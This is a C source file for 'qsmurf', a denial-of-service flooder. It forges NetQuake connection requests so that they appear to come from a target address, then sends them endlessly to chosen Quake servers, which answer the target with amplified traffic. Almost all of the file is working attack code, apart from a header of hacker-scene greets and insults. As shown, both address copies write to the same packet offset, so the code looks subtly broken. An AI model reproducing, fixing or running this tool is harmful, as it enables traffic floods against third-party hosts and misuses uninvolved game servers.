/*
  qsmurf.c
  Written by Jamal Motsa (Haul@EFnet), based on qflood.c by Andy Gavin (_k3nny@EFnet, k@ETG)
  Look at his original post for the original credits.
  The anti-script kiddie file descriptor bug has been removed and the code was cleaned up a lot.

  This works based on the fact that when a Quake client connects to a Quake server, much more data
  is received by the client than is sent.  This program will spoof connections from a target (source
  IP Address) to NetQuake servers, which will reply to the target with lots of data with an
  amplification rate approaching 20:1.

  Greets to:
  Sean Stanek (vulture@EFnet) for doing most of the code optimization.
  SFS, WHHS, Marlboro, the Shao Lin
  Lithium Node and channel regulars, TPC, X-Tommy, the defunct #BrainFreze Jeff, NEO, Kwizatz@RURC
  Sang, zuez, dead-sexy.com and crew, #phear on EFnet, AY, Eric R. for providing me with DNS

  And a big middle finger to:
  BTA (for being quite possibly the worse Quake 3 clan in history)
  anyone who packets EFnet servers
  and finally, to whoever framed OJ
*/

#include <ctype.h>
#include <errno.h>
#include <netdb.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <sys/types.h>

struct sockaddr sa;
struct node
{
  char *address;
  struct node *next;
  unsigned int ip;
};

struct node *head = NULL;
struct node *tail;

void add_address( struct node **, char * );
void sig_handler( int );

int main( int argc, char **argv )
{
  int x = 1;
  int source_port, delay, fd;
  unsigned int ip;
  struct sockaddr_in *p;
  struct hostent *he;
  struct node *current;
  char *temp;

  u_char thePACKET[41]=
  {
    0x45,                       /* IP version, header len */
    0x00,                       /* IP diff services field */
    0x00, 0x29,                 /* IP total length */
    0xc2, 0xb5,                 /* IP id */
    0x00, 0x00,                 /* IP fragment offset */
    0x80,                       /* IP TTL */
    0x11,                       /* IP protocol */
    0, 0,                       /* IP header checksum */
    0, 0, 0, 0,                 /* IP src */
    0, 0, 0, 0,                 /* IP dest */
    0x00, 0x00,                 /* UDP src port */
    0, 0,                       /* UDP dest port */
    0x00, 0x15,                 /* length = 21 */
    0x00, 0x00,                 /* UDP checksum */
    0x80, 0x00,                 /* Quake flags */
    0x00, 0x0d,                 /* Quake length */
    0x01,                       /* Quake command = connect */
    0x51, 0x55, 0x41, 0x4b,     /* Quake game = QUAKE */
    0x45, 0x00,
    0x03, 0x01                  /* Quake version = 3 */
  };

  if( argc != 5 )
  {
    fprintf( stderr, "\nqsmurf - floods targets with amplified UDP packets using the NetQuake protocol\n" );
    fprintf( stderr, "\tWritten by Jamal Motsa (Haul@EFnet)\n" );
    fprintf( stderr, "\tUsage: %s <servers> <src> <server_port> <delay>\n", *argv );
    fprintf( stderr, "\t\tservers = comma-delimited list of IP Address/hostnames of Quake servers\n" );
    fprintf( stderr, "\t\tsrc = IP Address/hostname of target\n" );
    fprintf( stderr, "\t\tserver_port = Quake server port\n" );
    fprintf( stderr, "\t\tdelay = delay between connection requests (in usec, 0 for no delay)\n" );
    fprintf( stderr, "\t\texample: %s 10.0.0.2,10.0.0.3 10.0.0.10 26000 50000\n\n", argv[0] );
    exit( 0 );
  }

  srand( time( NULL ));
  delay = atoi( argv[4] );

  /* build a linked list of addresses entered on command line */
  temp = strtok( argv[1], "," );
  add_address( &head, temp );

  signal( SIGINT, sig_handler );

  tail = head;

  temp = strtok( NULL, "," );
  while( temp != NULL )
  {
    add_address( &(tail->next), temp );
    tail = tail->next;
    temp = strtok( NULL, "," );
  }

  current = head;

  if(( fd=socket( AF_INET, SOCK_RAW, IPPROTO_RAW )) == -1 )
  {
    perror( "Can't create raw socket (you must run as root)" );
    exit( 0 );
  }

  if( setsockopt( fd, IPPROTO_IP, IP_HDRINCL, (char*)&x, sizeof(x)) < 0 )
  {
    perror( "setsockopt IP_HDRINCL error" );
    exit( 0 );
  }

  if( ( he = gethostbyname( argv[2]) ) == NULL )
  {
    fprintf( stderr, "Can't resolve src\n" );
    exit( 0 );
  }

  bcopy( *( he->h_addr_list ), &ip, 4 );


  while( 1 )
  {
    while( current != NULL )
    {
      bcopy( &ip, ( thePACKET + 16 ), 4 );
      bcopy( &(current->ip), ( thePACKET + 16 ), 4 );

      source_port = rand() % 3976 + 1024;

      *(u_short*)(thePACKET + 20) = htons( (u_short) source_port );
      *(u_short*)(thePACKET + 22) = htons( (u_short) atoi( argv[3] ));

      p = ( struct sockaddr_in* ) &sa;
      p->sin_family = AF_INET;
      bcopy( &current->ip, &(p->sin_addr), 4 );

      if(( sendto( fd, &thePACKET, sizeof(thePACKET), 0, (struct sockaddr*)p, sizeof(struct sockaddr ))) == -1)
      {
        perror( "sendto error" );
        exit( 0 );
      }

      printf( "Quake connection request sent from %s:%i to %s:%s\n", argv[2], source_port, current->address,
argv[3] );

      if( delay > 0 ) usleep( delay );
      current = current->next;
    }
    current = head;
  }
  exit( 1 );
}

void add_address( struct node** reference, char *data )
{
  struct hostent * he;
  struct node* new_node = malloc( sizeof( struct node ));

  new_node->address = data;
  new_node->next = *reference;

  if( ( he = gethostbyname( new_node->address )) == NULL )
  {
    fprintf( stderr, "Can't resolve server\n");
    exit( 0 );
  }
  bcopy( *( he->h_addr_list ), &(new_node->ip), 4 );

  *reference = new_node;
}

void sig_handler( int number )
{
  struct node *current = head;
  struct node *next;

  printf( "\nCaught SIGINT.  Cleaning up memory..." );
  while( current != NULL )
  {
    next = current->next;
    free( current );
    current = next;
  }
  printf( "done.\n\n" );
  exit( 1 );
}











